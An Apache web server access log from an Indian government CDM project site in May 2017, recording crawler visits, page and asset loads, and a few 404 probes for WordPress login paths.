157.55.39.227 - - [29/May/2017:07:21:25 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [29/May/2017:07:25:00 +0530] "GET /registration.php HTTP/1.1" 302 28528 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [29/May/2017:07:25:01 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.227 - - [29/May/2017:07:25:02 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /aboutus.php HTTP/1.1" 200 19596 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/h_aboutus.jpg HTTP/1.1" 200 21693 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/login1.jpg HTTP/1.1" 200 618 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/login.jpg HTTP/1.1" 200 1044 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/bullet3.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/fe.jpg HTTP/1.1" 200 1429 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:45 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:46 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
157.119.80.248 - - [29/May/2017:07:25:46 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/aboutus.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
66.249.79.91 - - [29/May/2017:07:25:52 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.227 - - [29/May/2017:07:26:56 +0530] "GET /project_details_view.php?id=1037 HTTP/1.1" 200 14755 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:07:29:03 +0530] "GET /project_details_view.php?id=1501 HTTP/1.1" 200 15175 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.131 - - [29/May/2017:07:30:52 +0530] "GET /project_details_view_report.php?id=176 HTTP/1.1" 200 13100 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [29/May/2017:07:31:36 +0530] "GET /project_details_view_report.php?id=443 HTTP/1.1" 200 13124 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.99 - - [29/May/2017:07:36:24 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
211.0.145.111 - - [29/May/2017:07:41:57 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
66.249.79.131 - - [29/May/2017:07:46:01 +0530] "GET /project_details_view.php?id=265&oid=1&page=81&reporttype=1 HTTP/1.1" 200 14645 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.227 - - [29/May/2017:07:46:43 +0530] "GET /approval_process.php HTTP/1.1" 200 25911 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.15.142 - - [29/May/2017:07:47:52 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.99 - - [29/May/2017:07:51:06 +0530] "GET /images/NCDMA%20PCN%20Format%2017072009.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
178.137.83.79 - - [29/May/2017:07:55:03 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:03 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:04 +0530] "GET /xmlrpc.php?rsd HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:04 +0530] "GET /blog/robots.txt HTTP/1.1" 404 213 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:04 +0530] "GET /blog/ HTTP/1.1" 404 203 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:05 +0530] "GET /wordpress/ HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
178.137.83.79 - - [29/May/2017:07:55:05 +0530] "GET /wp/ HTTP/1.1" 404 201 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
66.249.79.133 - - [29/May/2017:07:56:22 +0530] "GET /project_details_view.php?id=692&oid=&page=66&reporttype= HTTP/1.1" 200 14235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.53.153 - - [29/May/2017:07:59:58 +0530] "GET /project_details_view_report.php?id=1423 HTTP/1.1" 200 13255 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.131 - - [29/May/2017:08:11:26 +0530] "GET /project_details_view.php?id=138&oid=1&page=86&reporttype=1 HTTP/1.1" 200 14177 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
8.37.235.120 - - [29/May/2017:08:12:34 +0530] "GET /project_details_view.php?id=1951 HTTP/1.1" 200 14238 "https://www.google.co.in/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/bulllet2.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/spacer.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/bullet1.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/bullet4.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:35 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:36 +0530] "GET /includes/ncdma.css HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:36 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:12:37 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
169.149.207.249 - - [29/May/2017:08:12:37 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:27 +0530] "GET /project_details_view.php?id=1951 HTTP/1.1" 200 14238 "https://www.google.co.in/" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /images/spacer.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /includes/ncdma.css HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /images/bulllet2.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /images/bullet1.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /images/bullet4.gif HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
8.37.235.120 - - [29/May/2017:08:13:28 +0530] "GET /ncdma.css HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=1951" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X; en-US) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14A456 UCBrowser/10.8.9.968 Mobile"
202.46.54.21 - - [29/May/2017:08:14:31 +0530] "GET /project_details_view_report.php?id=131 HTTP/1.1" 200 13117 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.99 - - [29/May/2017:08:18:27 +0530] "GET /future_projects.php HTTP/1.1" 302 26209 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [29/May/2017:08:18:28 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.99 - - [29/May/2017:08:18:29 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
106.76.229.82 - - [29/May/2017:08:19:39 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
106.76.229.82 - - [29/May/2017:08:19:39 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.218.73.162 - - [29/May/2017:08:21:06 +0530] "GET /approval_process.php HTTP/1.1" 200 25911 "http://cdmindia.gov.in/approval_process.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36"
46.218.73.162 - - [29/May/2017:08:21:10 +0530] "GET /registration.php HTTP/1.1" 200 28528 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36"
46.218.73.162 - - [29/May/2017:08:21:13 +0530] "GET /registration.php HTTP/1.1" 200 28528 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36"
46.218.73.162 - - [29/May/2017:08:21:17 +0530] "GET /registration.php HTTP/1.1" 200 28528 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36"
46.218.73.162 - - [29/May/2017:08:21:22 +0530] "GET /registration.php HTTP/1.1" 200 28528 "http://cdmindia.gov.in/registration.php" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36"
66.249.79.131 - - [29/May/2017:08:22:59 +0530] "GET /project_details_view.php?id=1589&oid=&page=23&reporttype= HTTP/1.1" 200 14156 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [29/May/2017:08:26:29 +0530] "GET /project_details_view.php?id=1894&oid=1&page=9&reporttype=1 HTTP/1.1" 200 14276 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.50.181 - - [29/May/2017:08:29:04 +0530] "GET /project_details_view.php?id=1708 HTTP/1.1" 200 14186 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.63 - - [29/May/2017:08:36:01 +0530] "GET /sitemap.php HTTP/1.1" 200 18468 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /project_details_view.php?id=340 HTTP/1.1" 200 14632 "http://www.google.co.in/search?q=G.S.E.G&clientAction=534.click&btnG=Search" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "-" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
8.37.225.87 - - [29/May/2017:08:36:06 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=340" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
211.6.121.140 - - [29/May/2017:08:36:21 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
8.37.225.87 - - [29/May/2017:08:37:40 +0530] "GET /project_details_view.php?id=340 HTTP/1.1" 200 14632 "http://www.google.co.in/search?q=G.S.E.G&clientAction=534.click&btnG=Search" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
157.55.39.63 - - [29/May/2017:08:38:14 +0530] "GET /capacity_building.php HTTP/1.1" 200 19185 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
112.202.31.229 - - [29/May/2017:08:38:27 +0530] "GET /wp-login.php HTTP/1.1" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.202.31.229 - - [29/May/2017:08:38:29 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.79.133 - - [29/May/2017:08:41:40 +0530] "GET /project_details_view.php?id=1932&oid=&page=9&reporttype= HTTP/1.1" 200 14282 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.129 - - [29/May/2017:08:45:44 +0530] "GET /project_details_view_report.php?id=720 HTTP/1.1" 200 13206 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.148 - - [29/May/2017:08:47:28 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.159 - - [29/May/2017:08:47:37 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.227 - - [29/May/2017:08:48:06 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:08:49:08 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18712 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:08:49:09 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [29/May/2017:08:49:10 +0530] "GET /index.php HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
202.46.54.27 - - [29/May/2017:08:58:09 +0530] "GET /project_details_view.php?id=1396 HTTP/1.1" 200 15303 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.131 - - [29/May/2017:09:02:00 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.131 - - [29/May/2017:09:02:00 +0530] "GET / HTTP/1.1" 200 19479 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
